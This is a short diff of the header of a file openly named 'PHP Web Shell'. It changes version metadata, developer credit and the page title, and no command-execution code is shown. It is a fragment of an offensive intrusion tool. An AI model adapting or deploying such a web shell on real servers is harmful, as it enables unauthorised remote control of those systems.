@@ -1,16 +1,17 @@
 <!-- Project Name : PHP Web Shell -->
-<!-- Version : 0.01 -->
-<!-- First development date : 2012/07/31 -->
-<!-- This Version development date : 2012/07/31 -->
-<!-- Moded on and working with PHP 8 : 2022/10/05 -->
+<!-- Version : 4.0 nu11secur1ty -->
+<!-- First development date : 2022/10/05 -->
+<!-- This Version development date : 2022/10/05 -->
+<!-- Moded and working with PHP 8 : 2022/10/05 -->
 <!-- language : html, css, javascript, php -->
-<!-- Developer : majorPE -->
-<!-- Web site : http://blog.naver.com/xornrbboy -->
+<!-- Developer : nu11secur1ty -->
+<!-- Web site : https://www.nu11secur1ty.com/ -->
+
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
 <html>
 	<head>
 		<meta http-equiv="Content-Type" content="text/html" charset="euc-kr">
-		<title>PHP Web Shell Ver 0.01 by majorPE</title>
+		<title>PHP Web Shell Ver 4.0 by nu11secur1ty</title>
 		<script type="text/javascript">
 			function FocusIn(obj)
 			{
